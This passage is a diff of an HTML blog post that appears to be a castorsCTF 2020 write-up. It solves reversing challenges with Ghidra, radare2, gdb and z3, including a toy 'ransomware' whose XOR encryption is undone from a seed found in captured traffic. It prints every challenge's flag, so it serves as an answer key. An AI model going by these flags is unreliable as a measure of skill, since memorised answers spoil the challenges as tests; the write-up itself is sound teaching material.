 <span class="p">}</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc one.c
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc one.c
 $ ./a.out
 cstorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}cstorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}cstorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}caaaa
-</code></pre></div></div>
-
-<h5 id="flag-1">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cstorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}
-</code></pre></div></div>
-
-<h3 id="reversing">Reversing</h3>
-
-<p>I really appreciated the reversing challenges especially the GO(lang) ones as I
-had never done go reverse engineering and I learned a lot.</p>
-
-<h4 id="stacking-50-pts-208-solves">Stacking (50 pts 208 solves)</h4>
-
-<h5 id="description-2">Description</h5>
-
-<p><a href="/assets/files/castorsCTF20/stacking"><code class="language-plaintext highlighter-rouge">stacking</code></a></p>
-
-<h5 id="solution-2">Solution</h5>
-
-<video controls="true">
-	<source src="/assets/files/castorsCTF20/stacking.mp4" />
-</video>
-
-<h5 id="flag-2">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{w3lc0m3_70_r3v3r53_3n61n33r1n6}
-</code></pre></div></div>
-
-<h4 id="xor-74-points-147-solves">XoR (74 points 147 solves)</h4>
-
-<h5 id="description-3">Description</h5>
-
-<p><a href="/assets/files/castorsCTF20/xorry"><code class="language-plaintext highlighter-rouge">xorry</code></a></p>
-
-<h5 id="solution-3">Solution</h5>
-
-<video controls="true">
-	<source src="/assets/files/castorsCTF20/xor.mp4" />
-</video>
-
-<h5 id="flag-3">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{x0rr1n6_w17h_4_7w157}
-</code></pre></div></div>
-
-<h4 id="reverse-me-288-points-104-solves">Reverse-me (288 points 104 solves)</h4>
-
-<h5 id="description-4">Description</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: Krekel
+</code></pre></div></div><h5 id="flag-1">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cstorsCTF{k33p_y0ur_k3y5_53cr37_4nd_d0n7_r3u53_7h3m!}
+</code></pre></div></div><h3 id="reversing">Reversing</h3><p>I really appreciated the reversing challenges especially the GO(lang) ones as I had never done go reverse engineering and I learned a lot.</p><h4 id="stacking-50-pts-208-solves">Stacking (50 pts 208 solves)</h4><h5 id="description-2">Description</h5><p><a href="/assets/files/castorsCTF20/stacking"><code class="language-plaintext highlighter-rouge">stacking</code></a></p><h5 id="solution-2">Solution</h5><video controls="true"><source src="/assets/files/castorsCTF20/stacking.mp4"/></video><h5 id="flag-2">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{w3lc0m3_70_r3v3r53_3n61n33r1n6}
+</code></pre></div></div><h4 id="xor-74-points-147-solves">XoR (74 points 147 solves)</h4><h5 id="description-3">Description</h5><p><a href="/assets/files/castorsCTF20/xorry"><code class="language-plaintext highlighter-rouge">xorry</code></a></p><h5 id="solution-3">Solution</h5><video controls="true"><source src="/assets/files/castorsCTF20/xor.mp4"/></video><h5 id="flag-3">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{x0rr1n6_w17h_4_7w157}
+</code></pre></div></div><h4 id="reverse-me-288-points-104-solves">Reverse-me (288 points 104 solves)</h4><h5 id="description-4">Description</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: Krekel
 
 nc chals20.cybercastors.com 14427
-</code></pre></div></div>
-
-<p><a href="/assets/files/castorsCTF20/reverse_me"><code class="language-plaintext highlighter-rouge">reverse_me</code></a></p>
-
-<h5 id="solution-4">Solution</h5>
-
-<p>Looking at the main function inside of ghidra gives the following:</p>
-
-<p><img src="/assets/files/castorsCTF20/reverse_me_main.png" alt="main" /></p>
-
-<p>As you can see, it reads the flag from <code class="language-plaintext highlighter-rouge">flag.txt</code> calls some functions on the
-read flag, then prints the flag after those functions have been called.</p>
-
-<p>If you connect to the given endpoint you can get those bytes:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14427
+</code></pre></div></div><p><a href="/assets/files/castorsCTF20/reverse_me"><code class="language-plaintext highlighter-rouge">reverse_me</code></a></p><h5 id="solution-4">Solution</h5><p>Looking at the main function inside of ghidra gives the following:</p><p><img src="/assets/files/castorsCTF20/reverse_me_main.png" alt="main"/></p><p>As you can see, it reads the flag from <code class="language-plaintext highlighter-rouge">flag.txt</code> calls some functions on the read flag, then prints the flag after those functions have been called.</p><p>If you connect to the given endpoint you can get those bytes:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc chals20.cybercastors.com 14427
 System Error...
 Dumping memory...
 64 35 68 35 64 37 33 7a 38 6b 33 37 6b 72 67 7a
 Enter password: password
 Wrong!
-</code></pre></div></div>
-
-<p><img src="/assets/files/castorsCTF20/reverse_me_FUN_0010096a.png" alt="FUN_0010096a" />
-<img src="/assets/files/castorsCTF20/reverse_me_add_2.png" alt="add_2" />
-<img src="/assets/files/castorsCTF20/reverse_me_FUN_001009c7.png" alt="FUN_001009c7" /></p>
-
-<p>The function <code class="language-plaintext highlighter-rouge">FUN_0010096a</code> replaces the last newline (<code class="language-plaintext highlighter-rouge">\n</code>), with a null
-terminator (<code class="language-plaintext highlighter-rouge">\0</code>). The function <code class="language-plaintext highlighter-rouge">add_2</code> (renamed by myself in ghidra), adds 2 to
-each byte of the flag and the function <code class="language-plaintext highlighter-rouge">FUN_001009c7</code>, does some calculations on
-the bytes based on the value of the byte.</p>
-
-<p>We can then reverse those functions using z3 to get the flag:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</code></pre></div></div><p><img src="/assets/files/castorsCTF20/reverse_me_FUN_0010096a.png" alt="FUN_0010096a"/><img src="/assets/files/castorsCTF20/reverse_me_add_2.png" alt="add_2"/><img src="/assets/files/castorsCTF20/reverse_me_FUN_001009c7.png" alt="FUN_001009c7"/></p><p>The function <code class="language-plaintext highlighter-rouge">FUN_0010096a</code> replaces the last newline (<code class="language-plaintext highlighter-rouge">\n</code>), with a null terminator (<code class="language-plaintext highlighter-rouge">\0</code>). The function <code class="language-plaintext highlighter-rouge">add_2</code> (renamed by myself in ghidra), adds 2 to each byte of the flag and the function <code class="language-plaintext highlighter-rouge">FUN_001009c7</code>, does some calculations on the bytes based on the value of the byte.</p><p>We can then reverse those functions using z3 to get the flag:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
 <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -626,19 +363,10 @@ the bytes based on the value of the byte.</p>
 <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
     <span class="n">sol</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">[</span><span class="n">x</span><span class="p">]].</span><span class="n">as_long</span><span class="p">())</span>
 <span class="k">print</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x solution.py
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x solution.py
 $ ./solution.py
 r3v3r51n6y15yfun
-</code></pre></div></div>
-
-<p>I tried to submit the flag <code class="language-plaintext highlighter-rouge">castorsCTF{r3v3r51n6y15yfun}</code> but it didn’t work.
-So I tried reproducing the code in the <code class="language-plaintext highlighter-rouge">reverse_me</code> binary and realised that it
-didn’t work for the value <code class="language-plaintext highlighter-rouge">0x6b</code> (after processing), <code class="language-plaintext highlighter-rouge">y</code> in what I thought was
-the flag:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</code></pre></div></div><p>I tried to submit the flag <code class="language-plaintext highlighter-rouge">castorsCTF{r3v3r51n6y15yfun}</code> but it didn’t work. So I tried reproducing the code in the <code class="language-plaintext highlighter-rouge">reverse_me</code> binary and realised that it didn’t work for the value <code class="language-plaintext highlighter-rouge">0x6b</code> (after processing), <code class="language-plaintext highlighter-rouge">y</code> in what I thought was the flag:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 </span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
 	<span class="kt">char</span> <span class="n">a</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
@@ -668,38 +396,14 @@ the flag:</p>
 		<span class="n">printf</span><span class="p">(</span><span class="s">"%x "</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
 	<span class="p">}</span>
 <span class="p">}</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc process.c
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc process.c
 $ ./a.out
 64 35 68 35 64 37 33 7a 38 7b 33 37 7b 72 67 7a 
-</code></pre></div></div>
-
-<p>As you can see from the output, the <code class="language-plaintext highlighter-rouge">7b</code> should be <code class="language-plaintext highlighter-rouge">6b</code>. I realised that this is
-where underscores would normally be placed and changed the <code class="language-plaintext highlighter-rouge">y</code>s to <code class="language-plaintext highlighter-rouge">_</code>s.</p>
-
-<h5 id="flag-4">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{r3v3r51n6_15_fun}
-</code></pre></div></div>
-
-<h4 id="mapping-484-points-30-solves">Mapping (484 points 30 solves)</h4>
-
-<h5 id="description-5">Description</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: Krekel
+</code></pre></div></div><p>As you can see from the output, the <code class="language-plaintext highlighter-rouge">7b</code> should be <code class="language-plaintext highlighter-rouge">6b</code>. I realised that this is where underscores would normally be placed and changed the <code class="language-plaintext highlighter-rouge">y</code>s to <code class="language-plaintext highlighter-rouge">_</code>s.</p><h5 id="flag-4">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{r3v3r51n6_15_fun}
+</code></pre></div></div><h4 id="mapping-484-points-30-solves">Mapping (484 points 30 solves)</h4><h5 id="description-5">Description</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: Krekel
 
 After wondering around lost in the dark, we finally found the map!
-</code></pre></div></div>
-
-<p><a href="/assets/files/castorsCTF20/mapping"><code class="language-plaintext highlighter-rouge">mapping</code></a></p>
-
-<h5 id="solution-5">Solution</h5>
-
-<p>The binary provided a go one, because if you look at the end of the file using
-text editor you can see Go function signatures:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ xxd mapping | tail
+</code></pre></div></div><p><a href="/assets/files/castorsCTF20/mapping"><code class="language-plaintext highlighter-rouge">mapping</code></a></p><h5 id="solution-5">Solution</h5><p>The binary provided a go one, because if you look at the end of the file using text editor you can see Go function signatures:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ xxd mapping | tail
 00204a20: 6974 0074 7970 652e 2e65 712e 666d 742e  it.type..eq.fmt.
 00204a30: 666d 7400 7374 7269 6e67 732e 6861 7368  fmt.strings.hash
 00204a40: 5374 7200 7374 7269 6e67 732e 436f 756e  Str.strings.Coun
@@ -710,37 +414,11 @@ text editor you can see Go function signatures:</p>
 00204a90: 7900 6d61 696e 2e63 7265 6174 654d 6170  y.main.createMap
 00204aa0: 7069 6e67 5461 626c 6500 6d61 696e 2e6d  pingTable.main.m
 00204ab0: 6169 6e00                                ain.
-</code></pre></div></div>
-
-<p>When executing it, it asks for a password and then says “Wrong!” when you enter
-the wrong password:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./mapping
+</code></pre></div></div><p>When executing it, it asks for a password and then says “Wrong!” when you enter the wrong password:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./mapping
 Enter Password
 hunter2
 Wrong!
-</code></pre></div></div>
-
-<p>When I opened the binary inside of ghidra I couldn’t really make sense of what
-was going because go uses different calling conventions then those used by C and
-C++. I searched online for go calling conventions and found <a href="https://dr-knz.net/go-calling-convention-x86-64.html">an
-article</a> that explained
-them. Because of this I ditched ghidra for r2. Because arguments are passed on
-the stack in go, you have the disable variable analysis in radare2: <code class="language-plaintext highlighter-rouge">e anal.vars
-= false</code>. By reverse engineering I was able to understand that a mapping between
-characters was created (with a hashmap), in the <code class="language-plaintext highlighter-rouge">main.createMappingTable</code>
-function and that in the <code class="language-plaintext highlighter-rouge">main.apply</code> function, the mapping was applied to the
-password given and it was then base64 encoded. Once those modifications had been
-done the password was compared to the string
-<code class="language-plaintext highlighter-rouge">eHpzdG9yc1hXQXtpYl80cjFuMmgxNDY1bl80MXloMF82Ml95MDQ0MHJfNGQxbl9iNXVyMn0=</code> which
-after base64 decoding gave
-<code class="language-plaintext highlighter-rouge">xzstorsXWA{ib_4r1n2h1465n_41yh0_62_y0440r_4d1n_b5ur2}</code>. I now had to reverse
-engineer the mapping to understand how it worked and recover the flag. The way I
-did it, is by sending a string containing all possible characters and then using
-gdb see what they were getting transformed to. Using this information I was able
-to make a script to decrypt the flag:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</code></pre></div></div><p>When I opened the binary inside of ghidra I couldn’t really make sense of what was going because go uses different calling conventions then those used by C and C++. I searched online for go calling conventions and found <a href="https://dr-knz.net/go-calling-convention-x86-64.html">an article</a> that explained them. Because of this I ditched ghidra for r2. Because arguments are passed on the stack in go, you have the disable variable analysis in radare2: <code class="language-plaintext highlighter-rouge">e anal.vars = false</code>. By reverse engineering I was able to understand that a mapping between characters was created (with a hashmap), in the <code class="language-plaintext highlighter-rouge">main.createMappingTable</code> function and that in the <code class="language-plaintext highlighter-rouge">main.apply</code> function, the mapping was applied to the password given and it was then base64 encoded. Once those modifications had been done the password was compared to the string <code class="language-plaintext highlighter-rouge">eHpzdG9yc1hXQXtpYl80cjFuMmgxNDY1bl80MXloMF82Ml95MDQ0MHJfNGQxbl9iNXVyMn0=</code> which after base64 decoding gave <code class="language-plaintext highlighter-rouge">xzstorsXWA{ib_4r1n2h1465n_41yh0_62_y0440r_4d1n_b5ur2}</code>. I now had to reverse engineer the mapping to understand how it worked and recover the flag. The way I did it, is by sending a string containing all possible characters and then using gdb see what they were getting transformed to. Using this information I was able to make a script to decrypt the flag:</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
 <span class="n">encrypted</span> <span class="o">=</span> <span class="s">"xzstorsXWA{ib_4r1n2h1465n_41yh0_62_y0440r_4d1n_b5ur2}"</span>
 <span class="n">sol</span> <span class="o">=</span> <span class="s">""</span>
@@ -823,9 +501,7 @@ to make a script to decrypt the flag:</p>
     <span class="k">print</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>
 
 <span class="k">print</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./solver.py
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./solver.py
 c
 ca
 cas
@@ -882,52 +558,8 @@ Traceback (most recent call last):
   File "./solver.py", line 80, in &lt;module&gt;
     sol += b[a.index(ord(x))]
 ValueError: 125 is not in list
-</code></pre></div></div>
-
-<h5 id="flag-5">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{my_7r4n5l4710n_74bl3_15_b3773r_7h4n_y0ur5}
-</code></pre></div></div>
-
-<h4 id="ransom-493-points-19-solves">Ransom (493 points 19 solves)</h4>
-
-<h5 id="description-6">Description</h5>
-
-<p>Author: Krekel</p>
-
-<p>Agent, we raided one the hideouts of a wanted cyber criminal. During the raid,
-we extracted what appears to be a POC ransomware. It appears the he left a
-picture for us, but it is encrypted. It is your task to reverse engineering this
-sample and find out what secrets lie within the file. We managed to capture some
-network traffic generated by the malware. Use it during your investigation.</p>
-
-<p>We are counting on you.</p>
-
-<p><a href="/assets/files/castorsCTF20/flag.png"><code class="language-plaintext highlighter-rouge">flag.png</code></a>
-<a href="/assets/files/castorsCTF20/ransom"><code class="language-plaintext highlighter-rouge">ransom</code></a>
-<a href="/assets/files/castorsCTF20/traffic.pcapng"><code class="language-plaintext highlighter-rouge">traffic.pcapng</code></a></p>
-
-<h5 id="solution-6">Solution</h5>
-
-<p>This was another go binary to reverse engineer. From the files we were given, it
-was already possible to guess that the <code class="language-plaintext highlighter-rouge">binary</code> had encrypted a file <code class="language-plaintext highlighter-rouge">flag.png</code>
-and we now had the encrypted version of it. The pcap would probably contain a
-key that was sent over the network and that would allow decryption. Looking at
-the disassembly in confirmed this. The binary gets seeds from a server and then
-sends back one of the seed which I assume was the actual seed used (I didn’t
-actually reverse engineer this part, to save time, as the worth case scenario of
-that assumption was me have to do work I should have done anyway). The binary
-then sets the seed used using
-<a href="https://golang.org/pkg/math/rand/#Seed"><code class="language-plaintext highlighter-rouge">rand.Seed</code></a>. The function
-<code class="language-plaintext highlighter-rouge">main.encrypt</code> is then called. It opens the file <code class="language-plaintext highlighter-rouge">flag.png</code>, and then xors each
-of the bytes with a random value from
-<a href="https://golang.org/pkg/math/rand/#Intn"><code class="language-plaintext highlighter-rouge">rand.Intn(254)</code></a>.</p>
-
-<p>Because in the <code class="language-plaintext highlighter-rouge">.pcapng</code>, the seed sent to the server was <code class="language-plaintext highlighter-rouge">1337</code>, I wrote a
-little go script that generated 1500 numbers with that seed, and then a python
-script that xored the content of <code class="language-plaintext highlighter-rouge">flag.png</code> with those numbers:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /seed HTTP/1.1
+</code></pre></div></div><h5 id="flag-5">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{my_7r4n5l4710n_74bl3_15_b3773r_7h4n_y0ur5}
+</code></pre></div></div><h4 id="ransom-493-points-19-solves">Ransom (493 points 19 solves)</h4><h5 id="description-6">Description</h5><p>Author: Krekel</p><p>Agent, we raided one the hideouts of a wanted cyber criminal. During the raid, we extracted what appears to be a POC ransomware. It appears the he left a picture for us, but it is encrypted. It is your task to reverse engineering this sample and find out what secrets lie within the file. We managed to capture some network traffic generated by the malware. Use it during your investigation.</p><p>We are counting on you.</p><p><a href="/assets/files/castorsCTF20/flag.png"><code class="language-plaintext highlighter-rouge">flag.png</code></a><a href="/assets/files/castorsCTF20/ransom"><code class="language-plaintext highlighter-rouge">ransom</code></a><a href="/assets/files/castorsCTF20/traffic.pcapng"><code class="language-plaintext highlighter-rouge">traffic.pcapng</code></a></p><h5 id="solution-6">Solution</h5><p>This was another go binary to reverse engineer. From the files we were given, it was already possible to guess that the <code class="language-plaintext highlighter-rouge">binary</code> had encrypted a file <code class="language-plaintext highlighter-rouge">flag.png</code> and we now had the encrypted version of it. The pcap would probably contain a key that was sent over the network and that would allow decryption. Looking at the disassembly in confirmed this. The binary gets seeds from a server and then sends back one of the seed which I assume was the actual seed used (I didn’t actually reverse engineer this part, to save time, as the worth case scenario of that assumption was me have to do work I should have done anyway). The binary then sets the seed used using <a href="https://golang.org/pkg/math/rand/#Seed"><code class="language-plaintext highlighter-rouge">rand.Seed</code></a>. The function <code class="language-plaintext highlighter-rouge">main.encrypt</code> is then called. It opens the file <code class="language-plaintext highlighter-rouge">flag.png</code>, and then xors each of the bytes with a random value from <a href="https://golang.org/pkg/math/rand/#Intn"><code class="language-plaintext highlighter-rouge">rand.Intn(254)</code></a>.</p><p>Because in the <code class="language-plaintext highlighter-rouge">.pcapng</code>, the seed sent to the server was <code class="language-plaintext highlighter-rouge">1337</code>, I wrote a little go script that generated 1500 numbers with that seed, and then a python script that xored the content of <code class="language-plaintext highlighter-rouge">flag.png</code> with those numbers:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /seed HTTP/1.1
 Host: 192.168.0.2:8081
 User-Agent: Go-http-client/1.1
 Content-Length: 11
@@ -941,9 +573,7 @@ Server: Werkzeug/1.0.1 Python/3.7.2
 Date: Fri, 22 May 2020 22:47:50 GMT
 
 "ok"
-</code></pre></div></div>
-
-<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+</code></pre></div></div><div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
 
 <span class="k">import</span> <span class="p">(</span>
 	<span class="s">"fmt"</span>
@@ -956,9 +586,7 @@ Date: Fri, 22 May 2020 22:47:50 GMT
 		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">254</span><span class="p">))</span>
 	<span class="p">}</span>
 <span class="p">}</span>
-</code></pre></div></div>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</code></pre></div></div><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">struct</span>
@@ -975,170 +603,38 @@ Date: Fri, 22 May 2020 22:47:50 GMT
     <span class="n">sol</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span><span class="p">)</span>
 
 <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sol</span><span class="p">))</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ go run rng.go &gt; xor
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ go run rng.go &gt; xor
 $ ./solution.py &gt; out.png
-</code></pre></div></div>
-
-<p><img src="/assets/files/castorsCTF20/out.png" alt="solution" /></p>
-
-<h5 id="flag-6">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{this_is_not_my_final_form}
-</code></pre></div></div>
-
-<h4 id="octopus-494-points-19-solves">Octopus (494 points 19 solves)</h4>
-
-<h5 id="description-7">Description</h5>
-
-<p>Author: icinta</p>
-
-<p>Hope you don’t get caught in one of the binary’s tentacles!</p>
-
-<p><a href="/assets/files/castorsCTF20/obfus"><code class="language-plaintext highlighter-rouge">obfus</code></a></p>
-
-<h5 id="solution-7">Solution</h5>
-
-<p>Opening the files in an editor, you can see that it has a <code class="language-plaintext highlighter-rouge">-----BEGIN
-CERTIFICATE-----</code> header and <code class="language-plaintext highlighter-rouge">-----END CERTIFICATE-----</code> footer, because the
-second to last line had the <code class="language-plaintext highlighter-rouge">=</code> padding from base64, I decided to base64 decode
-the file (with the header and footer removed).</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dC5pbml0AHR5cGUuLmVxLmZtdC5mbXQAbWFpbi5tYWluAA==
+</code></pre></div></div><p><img src="/assets/files/castorsCTF20/out.png" alt="solution"/></p><h5 id="flag-6">Flag</h5><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{this_is_not_my_final_form}
+</code></pre></div></div><h4 id="octopus-494-points-19-solves">Octopus (494 points 19 solves)</h4><h5 id="description-7">Description</h5><p>Author: icinta</p><p>Hope you don’t get caught in one of the binary’s tentacles!</p><p><a href="/assets/files/castorsCTF20/obfus"><code class="language-plaintext highlighter-rouge">obfus</code></a></p><h5 id="solution-7">Solution</h5><p>Opening the files in an editor, you can see that it has a <code class="language-plaintext highlighter-rouge">-----BEGIN CERTIFICATE-----</code> header and <code class="language-plaintext highlighter-rouge">-----END CERTIFICATE-----</code> footer, because the second to last line had the <code class="language-plaintext highlighter-rouge">=</code> padding from base64, I decided to base64 decode the file (with the header and footer removed).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dC5pbml0AHR5cGUuLmVxLmZtdC5mbXQAbWFpbi5tYWluAA==
 -----END CERTIFICATE-----
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -d no_headers
+</code></pre></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -d no_headers
 ELF&gt;0E@base64: invalid input
-</code></pre></div></div>
-
-<p>For some reason it said “invalid input”, however, I could already see that the
-little that had been decoded started with <code class="language-plaintext highlighter-rouge">ELF</code> suggesting it was an elf file.
-Looking at the <code class="language-plaintext highlighter-rouge">base64</code> man page, I noticed the <code class="language-plaintext highlighter-rouge">--ignore-garbage</code> option that
-ignored non-alphabet characters. With this, I was able to decode the file and
-execute it:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -di no_headers &gt; out
+</code></pre></div></div><p>For some reason it said “invalid input”, however, I could already see that the little that had been decoded started with <code class="language-plaintext highlighter-rouge">ELF</code> suggesting it was an elf file. Looking at the <code class="language-plaintext highlighter-rouge">base64</code> man page, I noticed the <code class="language-plaintext highlighter-rouge">--ignore-garbage</code> option that ignored non-alphabet characters. With this, I was able to decode the file and execute it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -di no_headers &gt; out
 $ ./out
 Estou procurando as palavras para falar em inglês ...
 Aqui vou
 [Y 2 F z d G 9 y c 0 N U R n t X a D B f c z Q x Z F 9 B b l k 3 a G x u R 1 9 C M H V U X 2 0 0 d E h 9]
-</code></pre></div></div>
-
-<p>The message translated (from Portuguese to English) was:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I'm looking for the words to speak in English ...
+</code></pre></div></div><p>The message translated (from Portuguese to English) was:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I'm looking for the words to speak in English ...
 Here you go
-</code></pre></div></div>
-
-<p>Because this was a reversing challenge, I opened it in <code class="language-plaintext highlighter-rouge">radare2</code> but couldn’t
-find anything, the binary was just loading the text it was printing from memory
-and nothing else, I then realised the string outputted might be encrypted, and
-it turns out that it is base64.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -d &lt;&lt;&lt; Y2FzdG9yc0NURntXaDBfczQxZF9Bblk3aGxuR19CMHVUX200dEh9
+</code></pre></div></div><p>Because this was a reversing challenge, I opened it in <code class="language-plaintext highlighter-rouge">radare2</code> but couldn’t find anything, the binary was just loading the text it was printing from memory and nothing else, I then realised the string outputted might be encrypted, and it turns out that it is base64.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ base64 -d &lt;&lt;&lt; Y2FzdG9yc0NURntXaDBfczQxZF9Bblk3aGxuR19CMHVUX200dEh9
 castorsCTF{Wh0_s41d_AnY7hlnG_B0uT_m4tH}
-</code></pre></div></div>
-
-<h5 id="flag-7">Flag</h5>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>castorsCTF{Wh0_s41d_AnY7hlnG_B0uT_m4tH}
-</code></pre></div></div>
-
-<h3 id="forensics">Forensics</h3>
-
-<h4 id="manipulation-50-points-151-solves">Manipulation (50 points 151 solves)</h4>
-
-<h5 id="description-8">Description</h5>
-
-<p>Author: icinta</p>
-
-<p>One of our clients sent us the password but we got this instead. He insists the
-password is in the image, can you help us?</p>
-
-<p><a href="/assets/files/castorsCTF20/pooh.jpg">pooh.jpg</a></p>
-
-<h5 id="solution-8">Solution</h5>
-
-<p>When opening the file, it looked like a hexdump, possibly one created using the
-tool <code class="language-plaintext highlighter-rouge">xxd</code>. The first line looked like the hexdump of a <code class="language-plaintext highlighter-rouge">jpg</code>, as it contains
-the string <code class="language-plaintext highlighter-rouge">Exif</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000010: 012c 0000 ffe1 20e8 4578 6966 0000 4949  .,.... .Exif..II
-</code></pre></div></div>
-
-<p>The last line of the hexdump looked as if it should have been the first line, as
-it had the offset <code class="language-plaintext highlighter-rouge">00000000</code> and also contained the magic bytes of a jpeg:</p>
-
